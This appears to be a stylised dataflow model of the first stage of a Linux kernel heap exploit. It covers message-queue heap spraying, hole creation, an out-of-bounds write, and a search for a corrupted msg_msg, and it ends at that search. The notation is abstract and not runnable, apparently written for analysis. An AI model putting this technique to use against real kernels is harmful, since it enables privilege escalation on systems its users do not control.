 [data1] int s;
 [data2] int fd;
 [data3] int ss[NUM_SOCKETS][2] empty : array { top };
 [data4] int pipefd[NUM_PIPEFDS][2];
 [data5] int msqid[NUM_MSQIDS] empty : array { top };

 [data6] char secondary_buf[SECONDARY_SIZE - SKB_SHARED_INFO_SIZE];

 [data7] struct msg_msg *msg;
 [data8] struct pipe_buf_operations *ops;
 [data9] struct pipe_buffer *buf;

 [data10] uint64_t kheap_addr = 0
 
 [data11] struct msg_primary :: empty : heap { top };
 [data12] struct msg_secondary :: empty : heap { top };
 [data13] struct msg_fake;

 [data14] struct data;
 [data15] uint64_t kbase_addr = 0;

 ======================================================
 [flow] data1.0 ---= socket(conts) ---> data1.1
 
 [flow] data3.0 * conts --- socketpair ---> [data3.1] non-empty : array { top 1,...,4 }
 [flow] data5.0 ---= msgget---> [data5.1] non-empty : array { top 1,...,4096 }

##############################################
 #### Stage 1 – Memory Corruption #######
 #############################################
 #### Spraying Primary Messages...####
 [flow] data11.0 * "0" --- memset ---> [data11.1] non-empty : heap { top "0"{4096} }
     *(int *)&[data11.1].mtext[0] = conts;
     *(int *)&[data11.1].mtext[4] = 1,…,4096;

 #### Spraying Secondary Messages...####
 [flow] data12.0 * "0" --- memset ---> [data12.1] non-empty : heap { top "0"{4096} }
     *(int *)&[data12.1].mtext[0] = conts;
     *(int *)&[data12.1].mtext[4] = 1,…,4096;

 #### Creating Holes in the Primary Message...####
 [flow] data5.1 * &data11.1 --- read_msg --->  [&data11.2] non-empty : heap {top, data11.2.1024, data11.2.2048 ,data11.2.3072}

########################
### Triggering the Out-Of-Bond Write does not lead to any data evolution but writes to the Heap ##
########################

### Searching for Corrupted Primary Message ###
[flow] data5.1 * &data12.1 --- peek_msg ---> [&data12.2] vulnerable : heap { top "corrupted data"{4096} }